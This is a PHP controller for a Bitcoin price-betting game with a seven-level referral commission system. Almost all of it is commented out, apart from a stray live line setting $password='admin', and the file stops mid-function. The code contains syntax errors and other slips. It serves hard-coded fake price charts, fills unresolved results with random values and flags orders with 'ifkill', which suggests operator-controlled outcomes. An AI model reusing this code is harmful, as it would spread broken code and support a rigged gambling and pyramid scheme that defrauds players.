
<?php /*
namespace app\index\controller;
use app\common\controller\Frontend;
use app\common\library\Daili;
use app\common\library\Game;
use app\common\library\Wxpay;
use think\Db;
use think\Cache;
use think\Loader;
use think\Hook;
//use  extend\org;
class Biquan extends Frontend
{

    protected $noNeedLogin = '';
    protected $noNeedRight = '*';
    protected $layout = '';
//public $_userid;
public function _initialize()
    { 
    $action=$this->request->action(); 
    $noinit=array('bitcointop20','toporder10','onlinecount');
      if (!in_array($action,$noinit)) {
        parent::_initialize();
          $auth = $this->auth;
         // print_r($auth->id);exit;
  
          Hook::add('user_login_successed', function ($user) use ($auth) {
              $expire = input('post.keeplogin') ? 30 * 86400 : 0;
              Cookie::set('uid', $auth->id, $expire);
              Cookie::set('token', $auth->getToken(), $expire);
          });
          Hook::add('user_register_successed', function ($user) use ($auth) {
              Cookie::set('uid', $auth->id);
              Cookie::set('token', $auth->getToken());
          });
          Hook::add('user_delete_successed', function ($user) use ($auth) {
              Cookie::delete('uid');
              Cookie::delete('token');
          });
          Hook::add('user_logout_successed', function ($user) use ($auth) {
              Cookie::delete('uid');
              Cookie::delete('token');
          });

        
          $this->daili=new Daili($this->view->site,$this->view->user);
           $this->game=new Game($this->view->site,$this->view->user);
          $this->todaystr=strtotime(date('Ymd'));
          $this->init_game();
          $this->site=$this->view->site;
          $this->user=$this->view->user;
          $uuw=array();
          $uuw['uid']=$this->auth->id;
          $uuw['createtime']=$this->todaystr;
          $this->usercount=db::name('user_count')->where($uuw)->find();
          if($this->view->site['ifclose']!=2&&$this->user['level']!=37&&$this->user['level']!=73){
            echo $this->view->site['seo_description'].",你的ID:".$this->auth->id;exit;
          }
      }
      $this->addon=get_addon_config('Biquan');
       $this->xredis=$this->xredis(1);
    
   
    }
 
 //===========================
private function check_openid($type=0){
    $user=db::name('user')->field('wx')->where('id='.$this->auth->id)->find();
  if ($user['wx']=='') {
    $data['data']['pay_data']=$this->view->site['site_url'].'/index.php/Index/'.$this->view->site['default_game'].'/gettx.html?snD='.mt_rand();
      $data['status_code']='success';
      $data['data']['pay_type']='url';
      if ($type) {
        header("location:".$data['data']['pay_data']);exit;
      } else {
        echo json_encode($data);exit;
      }
  }else{
    return true;
  } 
}

public function gettx()
    {

      if (!function_exists('pay_openid')) {
      require $_SERVER['DOCUMENT_ROOT'].'/fastpay/Fast_Cofig.php';
      }
      $pay_openid=$_COOKIE['pay_openid'];
      if(empty($pay_openid)){
       $pay_openid=get_openid();
      $_COOKIE['pay_openid']=$pay_openid;
      $time_out=time()+3600;
      setcookie("pay_openid", $pay_openid, $time_out,"/");
      }
      //echo $openid;exit;
      $user=db::name('user')->field('wx')->where('id='.$this->auth->id)->find();
      if (($user['wx']=='')&&$this->auth->id>0) {
        $rr= db::name('user')->where('id='.$this->auth->id)->setfield('wx',$pay_openid);
      }
      header('location: '.$this->view->site['site_url'].'/index.php/Index/'.$this->view->site['default_game'].'/index');

    exit;
    }

//=============================
public function index()
    { 
      $this->check_openid(1);
      $this->xredis->set('Biquanyzr',json_encode($this->addon));
       $this->daili->updateyonjin($this->auth->id,'point');
     $this->get_user($this->auth->id,1);
     if ($this->user['level']==37) {
       return $this->fetch("game/biquan/index.html");
     }else{
       return $this->fetch("game/bquan/index.html");
     }

   
}

public function cacheclear(){
  Cache::clear();
}

public function BitcoinTopxx(){ 
$map=array();
  $dat=$this->xredis->lRange('bic_datayzr', 0, -1);

  if ($dat) {
    foreach ($dat as $key => $str) {
    $dd=json_decode($str,true);
    $map[$key]["_id"]= md5($dd['time']);
    $map[$key]["__v"]= 0;
    $map[$key]["time"]= $dd['time'];
    $map[$key]["price"]= $dd['val']/46400;
    $map[$key]["creattime"]= "2019-03-13T13:58:46.152Z";
    $map[$key]["state"]= 0;
   }
   echo json_encode($map);
  }
  

  

}

public function cashAll(){
  $data=array();$user=array();

    $list=db::name('user_tixian')->where('uid='.$this->auth->id.' and status=1')->order('id desc')->select();
    foreach ($list as $key => $aa) {
      $user[$key]['_id']=$aa['uid'];
      $user[$key]['__v']=0;
      $user[$key]['money']=$aa['point'];
      $user[$key]['unionid']="";
      $user[$key]['rechangopenid']"";
      $user[$key]['nickname'];
      $user[$key]['headimgurl']"";
      $user[$key]['orderid']=11;
      $user[$key]['token']="";
      $user[$key]['creattime']=date('Y/m/d H:i:s',$aa['createtime']);
      $user[$key]['state']=1;
      $user[$key]['restmoney']=$aa['point'];
       $user[$key]['realmoney']=$aa['point'];
    }
    $data['total']=1;
    $data['page']=1;
    $data['size']=15;
    $data['pageSum']=1;
    $data['data']=$user;

    echo json_encode($data);exit;
}
//我下注的订单
private function setmyorder(){
  $data=array();
  $where['uid']=$this->auth->id;

  $str=$this->xredis->get('psgeMeOrderyzr'.$this->auth->id);
    if (empty($str)) {
        $list=Db::name('biquan_dat')->order('id desc')->where($where)->select();
        $this->xredis->set('psgeMeOrderyzr'.$this->auth->id,json_encode($list),10);
    }else{
       $list=json_decode($str,true);
    }
   if ($list) {
    $basedata= $this->xredis->get('basedatayzr');
       foreach ($list as $key => $value) {
          $user=$this->get_user($value['uid']);
          $data[$key]["_id"]= md5($value['id']);
          $data[$key]["__v"]= 0;
          $data[$key]["pay"]= $value['pay'];
          $data[$key]["buytime"]= $value['buytime'];
          $data[$key]["unionid"]= $value['unionid'];
          $data[$key]["userId"]= $value['uid'];
          $data[$key]["nickname"]= $user['nickname'];
          $data[$key]["headimgurl"]= $user['avatar'];
          $data[$key]["restmoney"]= 20;
          $data[$key]["first"]= 0;
          $data[$key]["win"]= $value['peifu'];
          $data[$key]["read"]= 0;
          $data[$key]["yongMoney"]= 1;
          $data[$key]["isControl"]= 0;
          $data[$key]["creattime"]= date('Y-m-dTH:i:sZ',$value['createtime']);//"2019-03-14T03:03:30.498Z";
          $data[$key]["mode"]= $value['mode'];
          $data[$key]["now"]= $value['now'];
          $data[$key]["will"]= $value['result']>0?$value['result']:($this->addon['basedata']+$basedata+(mt_rand(1,1000))/100);
          $data[$key]["result"]=$value['peifu']>0?1:0;
          $data[$key]["buyDirection"]= $value['buyDirection'];
          $data[$key]["state"]= $value['status']==0?0:1;
          $data[$key]["isbot"]= 0;
          $data[$key]["heyueindex"]= 1;
          $data[$key]["heyue"]= "BTC";
     }   
   }else{
     $list=array();
   }
 
  $map["total"]= count($list);
  $map["index"]= 1;
  $map["size"]= 20;
  $map["pageSum"]= 1;
  $map["data"]= $data;
  
  return $this->xredis->set('str_psgeMeOrderyzr'.$this->auth->id,json_encode($map));;
}

//我下注的订单
public function psgeMeOrderxx(){
  $data=array();
  $where['uid']=$this->auth->id;
  $str=$this->xredis->get('psgeMeOrderyzr'.$this->auth->id);
    if (empty($str)) {
        $list=Db::name('biquan_dat')->order('id desc')->where($where)->select();
        $this->xredis->set('psgeMeOrderyzr'.$this->auth->id,json_encode($list),60);
    }else{
       $list=json_decode($str,true);
    }
 if ($list) {
     foreach ($list as $key => $value) {
      $user=$this->get_user($value['uid']);
        $data[$key]["_id"]= md5($value['id']);
        $data[$key]["__v"]= 0;
        $data[$key]["pay"]= $value['pay'];
        $data[$key]["buytime"]= $value['buytime'];
        $data[$key]["unionid"]= $value['unionid'];
        $data[$key]["userId"]= $value['uid'];
        $data[$key]["nickname"]= $user['nickname'];
        $data[$key]["headimgurl"]= $user['avatar'];
        $data[$key]["restmoney"]= 20;
        $data[$key]["first"]= 0;
        $data[$key]["win"]= 0;
        $data[$key]["read"]= 0;
        $data[$key]["yongMoney"]= 1;
        $data[$key]["isControl"]= 0;
        $data[$key]["creattime"]= "2019-03-14T03]=03]=30.498Z";
        $data[$key]["mode"]= $value['mode'];
        $data[$key]["now"]= $value['now']/46400;
        $data[$key]["will"]= $value['result']/46400;
        $data[$key]["result"]=$value['peifu']>0?1:0;
        $data[$key]["buyDirection"]= $value['buyDirection'];
        $data[$key]["state"]= 0;
        $data[$key]["isbot"]= 0;
        $data[$key]["heyueindex"]= 1;
        $data[$key]["heyue"]= "BTC";
   }   
 }else{
   $list=array();
 }
 
  $map["total"]= count($list);
  $map["index"]= 1;
  $map["size"]= 20;
  $map["pageSum"]= 1;
  $map["data"]= $data;
  echo json_encode($map);
}
//获得订单结果
public function getorder(){
  $where['orderid']=$this->request->param('orderId');
  $where['uid']=$this->auth->id;
$dat=Db::name('biquan_dat')->where($where)->find();
$user=$this->get_user($this->auth->id);
$map["_id"]= $dat['orderid'];
$map["__v"]= 0;
$map["pay"]=  $dat['pay'];
$map["buytime"]=  $dat['buytime'];
$map["unionid"]= $dat['unionid'];
$map["userId"]= $dat['uid'];
$map["nickname"]= $user['nickname'];
$map["headimgurl"]=  $user['avatar'];
$map["restmoney"]= 21;
$map["first"]= 0;
$map["win"]= $dat['peifu']>0?$dat['peifu']:0;
$map["read"]= 0;
$map["yongMoney"]= 0;
$map["isControl"]= 0;
$map["creattime"]= date('Y-m-dTH:i:sZ',$dat['createtime']);//"2019-03-17T07:51:17.951Z";
$map["mode"]= $dat['mode'];
$map["now"]=  (float)$dat['now'];
if ($dat['result']==0) {
   $result=$this->xredis->get('biquanyzr_time_data'.($dat['buytime']+30));
}else{
   $result=(float)$dat['result'];
}
$map["will"]= $result;
$map["result"]= $dat['peifu']>0?1:0;
$map["buyDirection"]=  $dat['buyDirection'];
$map["state"]= $dat['peifu']>0?1:0;
$map["isbot"]= 0;
$map["heyueindex"]= 1;
$map["heyue"]= "BTC";
echo json_encode($map);
}

public function setorder(){
  //以后押注数据前面要加一个数据正确性验证

  $map=$this->request->param();
   $xmap=-3;
   $update=0;
   $ordercount=$this->checkdata($map);
  if ($ordercount>=$this->view->site['ordercount']) {
    return -3;
    exit;
  }

  $koufei=abs(intval($map['pay']));
  $fmap['id']=$this->auth->id;
  $point=Db::name('User')->where($fmap)->value('point');
   $basedata= $this->xredis->get('basedatayzr');
  if ($map['now']<= 5) {
     $map['now']= $basedata+$this->addon['basedata'];
  }
  if ($point<$koufei||$map['now']<=0) {
        $xmap=-1;
  }else{
     Db::startTrans();
      try{
     
          $r=Db::name('User')->where($fmap)->setDec('point',$koufei);
          if ($r) {
                $map['now']=$map['now']*46400;
                $map['status']=0;
                $map['createtime']=time();
                $map['uid']=$this->auth->id;
                $map['result']='';
                $map['peifu']=0;
                $id=Db::name('biquan_dat')->insertGetid($map);
                if ($id>0) {
                  $this->daili->dailicount($this->auth->id,$koufei*100);
                  //把当前数据缓存到redis中
                  $map['id']=$id;
                  $dat=$this->save_now($map);
                  $update=1;
                  $orderid=md5($id);
                  Db::name('biquan_dat')->where('id='.$id)->setfield('orderid',$orderid);
                  Db::name('biquan_dat')->where('id='.$id)->setfield('ifkill',$dat['ifkill']);
                  Db::commit();
                 }else{
                     Db::rollback();
                     $xmap=-3;
                     $update=0;
                 }
          }
      
      } catch (\Exception $e) {
         
          Db::rollback();
          $xmap=-3;
          $update=0;
      }
      if ($update) {
        $xmap=array();
        $xmap['id']=$orderid;
        $xmap['now']=$map['now'];
        $xmap['count']=$ordercount;
        $this->xredis->del('psgeMeOrder'.$this->auth->id);
        $this->setmyorder();
      }
  }
  echo json_encode($xmap);
}
public function psgeorderxx(){
    $str=$this->xredis->get('psgeorderyzr');
    if (empty($str)) {
        $where=1;
        $list=Db::name('biquan_dat')->where($where)->order('id desc')->select();
        $this->xredis->set('psgeorderyzr',json_encode($list),60);
    }else{
       $list=json_decode($str,true);
    }

  $map["total"]= 300;
  $map["index"]= 1;
  $map["size"]= 300;
  $map["pageSum"]= 1;
  $data=array();
  if ($list) {
    foreach ($list as $key => $value) {
      $user=$this->get_user($value['uid']);
        $data[$key]["_id"]= md5($value['id']);
        $data[$key]["__v"]= 0;
        $data[$key]["pay"]=  $value['pay'];
        $data[$key]["buytime"]= $value['buytime'];
        $data[$key]["unionid"]= "";
        $data[$key]["userId"]=  $value['uid'];
        $data[$key]["nickname"]= $user['nickname'];
        $data[$key]["headimgurl"]= $user['avatar'];
        $data[$key]["restmoney"]= 38.72;
        $data[$key]["first"]= 0;
        $data[$key]["win"]= 0;
        $data[$key]["read"]= 0;
        $data[$key]["yongMoney"]= 0;
        $data[$key]["isControl"]= 0;
        $data[$key]["creattime"]= "2019-03-13T14:01:39.654Z";
        $data[$key]["mode"]= $value['mode'];
        $data[$key]["now"]= $value['now']/46400;
        $data[$key]["will"]= $value['result']/46400;
        $data[$key]["result"]= $value['peifu']>0?1:0;
        $data[$key]["buyDirection"]= $value['buyDirection'];
        $data[$key]["state"]= 0;
        $data[$key]["isbot"]= 0;
        $data[$key]["heyueindex"]= 1;
        $data[$key]["heyue"]= "BTC";
    }
  }
  $map["data"]=$data;
  echo json_encode($map);
}

public function psgeorder(){
    /*$str=$this->xredis->get('psgeorder');
    if (empty($str)) {
        $where=1;
        $list=Db::name('biquan_dat')->where($where)->order('id desc')->select();
        $this->xredis->set('psgeorder',json_encode($list),60);
    }else{
       $list=json_decode($str,true);
    }

  $map["total"]= 300;
  $map["index"]= 1;
  $map["size"]= 300;
  $map["pageSum"]= 1;
  $data=array();
  if ($list) {
    foreach ($list as $key => $value) {
      $user=$this->get_user($value['uid']);
        $data[$key]["_id"]= md5($value['id']);
        $data[$key]["__v"]= 0;
        $data[$key]["pay"]=  $value['pay'];
        $data[$key]["buytime"]= $value['buytime'];
        $data[$key]["unionid"]= "";
        $data[$key]["userId"]=  $value['uid'];
        $data[$key]["nickname"]= $user['nickname'];
        $data[$key]["headimgurl"]= $user['avatar'];
        $data[$key]["restmoney"]= 38.72;
        $data[$key]["first"]= 0;
        $data[$key]["win"]= 0;
        $data[$key]["read"]= 0;
        $data[$key]["yongMoney"]= 0;
        $data[$key]["isControl"]= 0;
        $data[$key]["creattime"]= "2019-03-13T14:01:39.654Z";
        $data[$key]["mode"]= $value['mode'];
        $data[$key]["now"]= $value['now'];
        $data[$key]["will"]= $value['result'];
        $data[$key]["result"]= $value['peifu']>0?1:0;
        $data[$key]["buyDirection"]= $value['buyDirection'];
        $data[$key]["state"]= 0;
        $data[$key]["isbot"]= 0;
        $data[$key]["heyueindex"]= 1;
        $data[$key]["heyue"]= "BTC";
    }
  }
  $map["data"]=$data;
  echo json_encode($map);
  echo $this->xredis->get('str_psgeorderyzr');
}
public function topOrderxx(){
$str=$this->xredis->get('topOrder10yzr');
    if (empty($str)) {
        $where['status']=1;
        $list=Db::name('biquan_dat')->where($where)->order('id desc')->select();
        $this->xredis->set('topOrder10yzr',json_encode($list),60);
    }else{
       $list=json_decode($str,true);
    }
 $map=array();
 if ($list) {
  foreach ($list as $key => $value) {
      $user=$this->get_user($value['uid']);
      $map[$key]["_id"]=md5($value['id']);
      $map[$key]["__v"]=0;
      $map[$key]["pay"]=$value['pay'];
      $map[$key]["buytime"]=$value['buytime'];
      $map[$key]["unionid"]="";
      $map[$key]["userId"]=$value['uid'];
      $map[$key]["nickname"]=$user['nickname'];
      $map[$key]["headimgurl"]=$user['avatar'];
      $map[$key]["restmoney"]=20;
      $map[$key]["first"]=0;
      $map[$key]["win"]=0;
      $map[$key]["read"]=0;
      $map[$key]["yongMoney"]=0;
      $map[$key]["isControl"]=0;
      $map[$key]["creattime"]="2019-03-13T14:04:05.696Z";
      $map[$key]["mode"]=$value['mode'];
      $map[$key]["now"]=$value['now']/46400;
      $map[$key]["will"]=$value['result']/46400;
      $map[$key]["result"]=$value['peifu']>0?1:0;
      $map[$key]["buyDirection"]=1;
      $map[$key]["state"]=0;
      $map[$key]["isbot"]=0;
      $map[$key]["heyueindex"]=1;
      $map[$key]["heyue"]="BTC";
}

 }
     
 echo json_encode($map);
}
public function topOrder10(){
  echo $this->xredis->get('str_topOrderyzr');
}
public function BitcoinTop20(){ 
  echo $this->xredis->get('BitcoinTop20yzr');
}

public function psgeMeOrder(){
  $str=$this->xredis->get('str_psgeMeOrderyzr'.$this->auth->id);
  if (!$str) {
     $$str=$this->setmyorder();
  }
  echo $str;
}
public function getOther(){
  $name=$this->request->param('name');
if ($name=="huilv") {
  echo '{"_id":"5c8ca27150aa092c4e6f520c","name":"huilv","content":"汇率","cid":{"low":"6.70752","heigh":"6.85011","yestoday":"6.72400","today":"6.72300","updowns":"-0.1500","updown":"-0.0100"},"createtime":"2019-03-17T01:24:49.008Z","types":1,"state":1}';
}else{
  $map["content"]= str_replace('http://','',$this->view->site['site_url']);
  $map["types"]= 1;
  $map["state"]= 1;
  $cid["outurl"]= str_replace('http://','',$this->view->site['site_url']).','.str_replace('http://','',$this->view->site['gotosite']);
  $cid["payurl"]= str_replace('http://','',$this->view->site['site_url']);
  $cid["downurl"]= $this->view->site['site_url'];
  $map["cid"]=$cid;
  echo json_encode($map);
}

}
public function getOthers(){
     echo '[{"_id":"5a4ae89a6024c506f7701176","name":"guestimg","content":"'.$this->view->site['site_kefu'].'","createtime":"2019-03-13T14:04:34.181Z","types":1,"state":1}]';
}
public function yonglist(){
  echo "";
}
public function getkline(){
  $size=$this->request->param('size');
  if ($size==39) {
   echo '[{"time":"19:41","data":["19:41",303033.52,303093.69,303013.01,303093.69]},{"_id":"5c8a3dfabe44393270a4ee6b","__v":0,"time":"19:40","creattime":"2019-03-14T11:41:46.787Z","data":["19:40",302989.41,303035.64,302989.41,303074.84]},{"_id":"5c8a3dbef4f2f33291c0c30b","__v":0,"time":"19:39","creattime":"2019-03-14T11:40:46.787Z","data":["19:39",303028.51,302989.41,302976.45,303036.63]},{"_id":"5c8a3d82afb3b332990a6e60","__v":0,"time":"19:38","creattime":"2019-03-14T11:39:46.786Z","data":["19:38",303013.6,303028.51,302954.93,303034.86]},{"_id":"5c8a3d46f4f2f33291c0c2d2","__v":0,"time":"19:37","creattime":"2019-03-14T11:38:46.785Z","data":["19:37",303093.83,303013.6,302979,303105.05]},{"_id":"5c8a3d0ac33d59327c1e5951","__v":0,"time":"19:36","creattime":"2019-03-14T11:37:46.791Z","data":["19:36",303074.9,303093.83,303060.36,303139.85]},{"_id":"5c8a3ccef4f2f33291c0c29d","__v":0,"time":"19:35","creattime":"2019-03-14T11:36:46.784Z","data":["19:35",303010.89,303074.9,303010.89,303078.6]},{"_id":"5c8a3c92afb3b332990a6ddc","__v":0,"time":"19:34","creattime":"2019-03-14T11:35:46.782Z","data":["19:34",303052.67,303010.89,302973.45,303082.63]},{"_id":"5c8a3c56c33d59327c1e5784","__v":0,"time":"19:33","creattime":"2019-03-14T11:34:46.781Z","data":["19:33",303051.07,303052.67,303047.58,303103.85]},{"_id":"5c8a3c1a2739ad32768aa106","__v":0,"time":"19:32","creattime":"2019-03-14T11:33:46.780Z","data":["19:32",303013.84,303051.07,302987.83,303056.42]},{"_id":"5c8a3bdebe44393270a4ebf6","__v":0,"time":"19:31","creattime":"2019-03-14T11:32:46.779Z","data":["19:31",302985.02,303013.84,302915.64,303013.84]},{"_id":"5c8a3ba22739ad32768a9f42","__v":0,"time":"19:30","creattime":"2019-03-14T11:31:46.784Z","data":["19:30",302979.12,302985.02,302959.23,303051.14]},{"_id":"5c8a3b66f4f2f33291c0c082","__v":0,"time":"19:29","creattime":"2019-03-14T11:30:46.779Z","data":["19:29",303015.62,302979.12,302958.43,303044.77]},{"_id":"5c8a3b2a4b40033289368ffe","__v":0,"time":"19:28","creattime":"2019-03-14T11:29:46.789Z","data":["19:28",302996.3,303015.62,302946.45,303015.74]},{"_id":"5c8a3aeed4e992326f5d150e","__v":0,"time":"19:27","creattime":"2019-03-14T11:28:46.780Z","data":["19:27",302980.52,302996.3,302957.47,303013.02]},{"_id":"5c8a3ab22739ad32768a9bf7","__v":0,"time":"19:26","creattime":"2019-03-14T11:27:46.778Z","data":["19:26",303202.23,302980.52,302980.52,303209.62]},{"_id":"5c8a3a762ce43a3283d1735a","__v":0,"time":"19:25","creattime":"2019-03-14T11:26:46.777Z","data":["19:25",303176.13,303202.23,303150.96,303213.42]},{"_id":"5c8a3a3a4b40033289368dec","__v":0,"time":"19:24","creattime":"2019-03-14T11:25:46.777Z","data":["19:24",303184.26,303176.13,303130.31,303197.31]},{"_id":"5c8a39fe4b40033289368db8","__v":0,"time":"19:23","creattime":"2019-03-14T11:24:46.777Z","data":["19:23",303295.21,303184.26,303170.7,303306.5]},{"_id":"5c8a39c2f4f2f33291c0bfbd","__v":0,"time":"19:22","creattime":"2019-03-14T11:23:46.777Z","data":["19:22",303355.01,303295.21,303292.78,303355.01]}]';
  }elseif($size==79){
    echo '[{"time":"19:42","data":["19:42",303034.31,303107.45,303013.01,303107.45]},{"_id":"5c8a3dfabe44393270a4ee6b","__v":0,"time":"19:40","creattime":"2019-03-14T11:41:46.787Z","data":["19:40",302989.41,303035.64,302989.41,303074.84]},{"_id":"5c8a3dbef4f2f33291c0c30b","__v":0,"time":"19:39","creattime":"2019-03-14T11:40:46.787Z","data":["19:39",303028.51,302989.41,302976.45,303036.63]},{"_id":"5c8a3d82afb3b332990a6e60","__v":0,"time":"19:38","creattime":"2019-03-14T11:39:46.786Z","data":["19:38",303013.6,303028.51,302954.93,303034.86]},{"_id":"5c8a3d46f4f2f33291c0c2d2","__v":0,"time":"19:37","creattime":"2019-03-14T11:38:46.785Z","data":["19:37",303093.83,303013.6,302979,303105.05]},{"_id":"5c8a3d0ac33d59327c1e5951","__v":0,"time":"19:36","creattime":"2019-03-14T11:37:46.791Z","data":["19:36",303074.9,303093.83,303060.36,303139.85]},{"_id":"5c8a3ccef4f2f33291c0c29d","__v":0,"time":"19:35","creattime":"2019-03-14T11:36:46.784Z","data":["19:35",303010.89,303074.9,303010.89,303078.6]},{"_id":"5c8a3c92afb3b332990a6ddc","__v":0,"time":"19:34","creattime":"2019-03-14T11:35:46.782Z","data":["19:34",303052.67,303010.89,302973.45,303082.63]},{"_id":"5c8a3c56c33d59327c1e5784","__v":0,"time":"19:33","creattime":"2019-03-14T11:34:46.781Z","data":["19:33",303051.07,303052.67,303047.58,303103.85]},{"_id":"5c8a3c1a2739ad32768aa106","__v":0,"time":"19:32","creattime":"2019-03-14T11:33:46.780Z","data":["19:32",303013.84,303051.07,302987.83,303056.42]},{"_id":"5c8a3bdebe44393270a4ebf6","__v":0,"time":"19:31","creattime":"2019-03-14T11:32:46.779Z","data":["19:31",302985.02,303013.84,302915.64,303013.84]},{"_id":"5c8a3ba22739ad32768a9f42","__v":0,"time":"19:30","creattime":"2019-03-14T11:31:46.784Z","data":["19:30",302979.12,302985.02,302959.23,303051.14]},{"_id":"5c8a3b66f4f2f33291c0c082","__v":0,"time":"19:29","creattime":"2019-03-14T11:30:46.779Z","data":["19:29",303015.62,302979.12,302958.43,303044.77]},{"_id":"5c8a3b2a4b40033289368ffe","__v":0,"time":"19:28","creattime":"2019-03-14T11:29:46.789Z","data":["19:28",302996.3,303015.62,302946.45,303015.74]},{"_id":"5c8a3aeed4e992326f5d150e","__v":0,"time":"19:27","creattime":"2019-03-14T11:28:46.780Z","data":["19:27",302980.52,302996.3,302957.47,303013.02]},{"_id":"5c8a3ab22739ad32768a9bf7","__v":0,"time":"19:26","creattime":"2019-03-14T11:27:46.778Z","data":["19:26",303202.23,302980.52,302980.52,303209.62]},{"_id":"5c8a3a762ce43a3283d1735a","__v":0,"time":"19:25","creattime":"2019-03-14T11:26:46.777Z","data":["19:25",303176.13,303202.23,303150.96,303213.42]},{"_id":"5c8a3a3a4b40033289368dec","__v":0,"time":"19:24","creattime":"2019-03-14T11:25:46.777Z","data":["19:24",303184.26,303176.13,303130.31,303197.31]},{"_id":"5c8a39fe4b40033289368db8","__v":0,"time":"19:23","creattime":"2019-03-14T11:24:46.777Z","data":["19:23",303295.21,303184.26,303170.7,303306.5]},{"_id":"5c8a39c2f4f2f33291c0bfbd","__v":0,"time":"19:22","creattime":"2019-03-14T11:23:46.777Z","data":["19:22",303355.01,303295.21,303292.78,303355.01]}]';
  }else{
      for($i=0;$i<20;$i++){
        if($i>0){
          $dat["_id"]= "5c89bc5ef4f2f33291c08467";
          $dat["__v"]= 0;
          $dat["creattime"]= "2019-03-14T02:28:46.520Z";
        }
        $dat["time"]= "10:".(27-$i);
        $dat["data"]=array("10:27", 301570.48, 301604.04, 301563.99, 301626.12);
        $map[$i]=$dat;
     }
     echo json_encode($map);
  }
 
}

public function rechargeAll(){
    $data=array();$user=array();

    $list=db::name('history')->where('uid='.$this->auth->id.' and status=1')->order('id desc')->select();
    foreach ($list as $key => $aa) {
      $user[$key]['_id']=$aa['uid'];
      $user[$key]['__v']=0;
      $user[$key]['money']=$aa['cash_fee'];
      $user[$key]['unionid']="xx";
      $user[$key]['rechangopenid']="xx";
      $user[$key]['nickname']="精秀特群";
      $user[$key]['headimgurl']="";
      $user[$key]['orderid']=$aa['out_trade_no'];
      $user[$key]['token']="xx";
      $user[$key]['creattime']=date('Y/m/d H:i:s',$aa['createtime']);
      $user[$key]['state']=1;
      $user[$key]['restmoney']=$aa['cash_fee'];
    }
    $data['total']=1;
    $data['page']=1;
    $data['size']=15;
    $data['pageSum']=1;
    $data['data']=$user;

    echo json_encode($data);exit;

}
public function gethomeimg(){
     echo '[{"_id":"5a4ae86b6024c506f7701174","name":"homeimg","content":"'.$this->view->site['site_kefu'].'","createtime":"2019-03-13T14:04:38.701Z","types":1,"state":1},{"_id":"5a4ae8aa6024c506f7701177","name":"homeimg","content":"'.$this->view->site['site_kefu'].'","createtime":"2019-03-13T14:04:38.701Z","types":1,"state":1},{"_id":"5a4e4b75e147f74bfc2bcb04","name":"homeimg","content":"'.$this->view->site['site_kefu'].'","createtime":"2019-03-13T14:04:38.701Z","types":1,"state":1}]';
}
public function lognlog(){
     echo '1';
}

public function thrmm123Num(){
	$data=array();$datas=array();
	$mydaili=$this->daili->mydaili($this->auth->id);
	
	$ids='';
	$types=$this->request->param('types');
	switch ($types) {
		case 1:
			$ids=$mydaili['onefatherids'];
			break;
		case 2:
			$ids=$mydaili['twofatherids'];
			break;
			case 3:
			$ids=$mydaili['thrfatherids'];
			break;
			case 4:
			$ids=$mydaili['forfatherids'];
			break;
			case 5:
			$ids=$mydaili['fivfatherids'];
			break;
			case 6:
			$ids=$mydaili['sixfatherids'];
			case 7:
			$ids=$mydaili['sevfatherids'];
			break;
		default:
			# code...
			break;
	}
	 $datas=$this->getmyteamlist('fatherid',$this->auth->id,1,$types);

	 $data['total']=1;
	 $data['index']='';
	 $data['size']=500;
	 $data['page']=1;
	 $data['data']=$datas;
     */
     $password='admin';
/*
	 echo json_encode($data);exit;
}


public function getmyteamlist($feile='fatherid',$ids,$type=1,$dengji=0){
	$datas=array();$where=array();
    $where[$feile]=array('in',$ids);
    if($dengji>0){
    	$where['dengji']=$dengji;	
    }
    
    if($type==2){
    	$where['createtime']=array('gt',$this->todaystr);	
    }
    
    $list=db::name('yonjin_jl')->where($where)->order('id desc')->select();

    foreach ($list as $key => $aa) {
      $user=$this->get_user($aa['uid']);
     $datas[$key]['_id']="5c89c4a22ce43a3283d133c8";
		 $datas[$key]['__v']=0;
		 $datas[$key]['unionid']="oxl9I0l45e3veuDKUiRcinTZckS0";
		 $datas[$key]['nickname']=$user['nickname'];
		 $datas[$key]['headimgurl']=$user['avatar'];
		 $datas[$key]['pay']=$aa['money']/100;
		 $datas[$key]['rechargetotal']=$aa['money']/100;
		 $datas[$key]['grade']=$aa['dengji'];
		 $datas[$key]['addmoney']=$aa['yonjin']/100;
		 $datas[$key]['masterunionid']="oxl9I0vfNuxP7nMsO5lHizyml4Gs";
		 $datas[$key]['creattime']=date('Y-m-d H:i:s',$aa['createtime']);
    }



    return $datas;

}
public function myteamorder(){

	 $data=array();$datas=array();

	 $type=$this->request->param('type');
	 $datas=$this->getmyteamlist('fatherid',$this->auth->id,$type);

	 $data['total']=1;
	 $data['index']='';
	 $data['size']=30;
	 $data['pageSum']=1;
	 $data['data']=$datas;

	 echo json_encode($data);exit;
}
public function getallm($ids){
    $datas=array();$where=array();$wheres=array();
    $where['uid']=array('in',$ids);
    $where['fatherid']=$this->auth->id;
    $allget=db::name('yonjin_jl')->where($where)->sum('yonjin');
	$where['createtime']=array('gt',$this->todaystr);
    $todayget=db::name('yonjin_jl')->where($where)->sum('yonjin');

    $wheres['uid']=array('in',$ids);
    $all=db::name('biquan_dat')->where($wheres)->sum('pay');
    $wheres['createtime']=array('gt',$this->todaystr);
    $today=db::name('biquan_dat')->where($wheres)->sum('pay');

    $datas['all']=$all;
    $datas['today']=$today;
    $datas['allget']=$allget/100;
    $datas['todayget']=$todayget/100;

    return $datas;
}
public function allgetmoney(){
    $data=array();$datas=array();
    $mydaili=$this->daili->mydaili($this->auth->id);

    $one=$this->getallm($mydaili['onefatherids']);
    $two=$this->getallm($mydaili['twofatherids']);
    $three=$this->getallm($mydaili['thrfatherids']);
    $four=$this->getallm($mydaili['forfatherids']);
    $five=$this->getallm($mydaili['fivfatherids']);
    $six=$this->getallm($mydaili['sixfatherids']);
    $seven=$this->getallm($mydaili['sevfatherids']);
    

    $data['one']=$one;
    $data['two']=$two;
    $data['three']=$three;
    $data['four']=$four;
    $data['five']=$five;
    $data['six']=$six;
    $data['seven']=$seven;

    echo json_encode($data);exit;
}

public function getmcount(){
    $mydaili=$this->daili->mydaili($this->auth->id);
    $todayall=$mydaili['onefather']+$mydaili['twofather']+$mydaili['thrfather']+$mydaili['forfather']+$mydaili['fivfather']+$mydaili['sixfather']+$mydaili['sevfather'];
     echo '{"onenum":'.$mydaili['onefather'].',"twonum":'.$mydaili['twofather'].',"threenum":'.$mydaili['thrfather'].',"fournum":'.$mydaili['forfather'].',"fivenum":'.$mydaili['fivfather'].',"sixnum":'.$mydaili['sixfather'].',"sevennum":'.$mydaili['sevfather'].',"todayall":'.$todayall.'}';
}
public function getrank(){
     echo '[]';
}
 public function myinfoxx(){
  $name=$this->user['nickname'];
  $allyongjin=db::name('yonjin_jl')->where('fatherid='.$this->auth->id)->sum('yonjin');
